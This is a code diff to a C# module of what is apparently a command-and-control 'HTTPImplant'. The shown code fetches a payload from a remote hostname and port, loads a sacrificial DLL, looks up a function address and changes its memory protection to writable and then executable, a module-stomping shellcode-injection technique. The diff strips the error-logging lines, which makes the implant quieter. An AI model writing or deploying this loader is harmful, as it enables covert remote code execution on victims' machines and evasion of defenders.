@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Net.Http;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
 
@@ -31,20 +30,17 @@ namespace HTTPImplant.Modules
             byte[] payload = await CodeFetch.FetchCode(hostname, port, file);
             if (payload == null)
             {
-                Console.WriteLine("Failed to fetch data.");
             }
 
             IntPtr hModule = LoadLibrary(SACRIFICIAL_DLL);
             if (hModule == IntPtr.Zero)
             {
-                Console.WriteLine($"[!] LoadLibraryA Failed With Error: {Marshal.GetLastWin32Error()}");
                 return;
             }
 
             IntPtr pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
             if (pAddress == IntPtr.Zero)
             {
-                Console.WriteLine($"[!] GetProcAddress Failed With Error: {Marshal.GetLastWin32Error()}");
                 return;
             }
 
@@ -65,7 +61,6 @@ namespace HTTPImplant.Modules
             uint oldProtect;
             if (!VirtualProtect(pAddress, (uint)payload.Length, 0x04, out oldProtect))
             {
-                Console.WriteLine($"[!] VirtualProtect [RW] Failed With Error: {Marshal.GetLastWin32Error()}");
                 return false;
             }
 
@@ -73,7 +68,6 @@ namespace HTTPImplant.Modules
 
             if (!VirtualProtect(pAddress, (uint)payload.Length, 0x40, out oldProtect))
             {
-                Console.WriteLine($"[!] VirtualProtect [RWX] Failed With Error: {Marshal.GetLastWin32Error()}");
                 return false;
             }
 
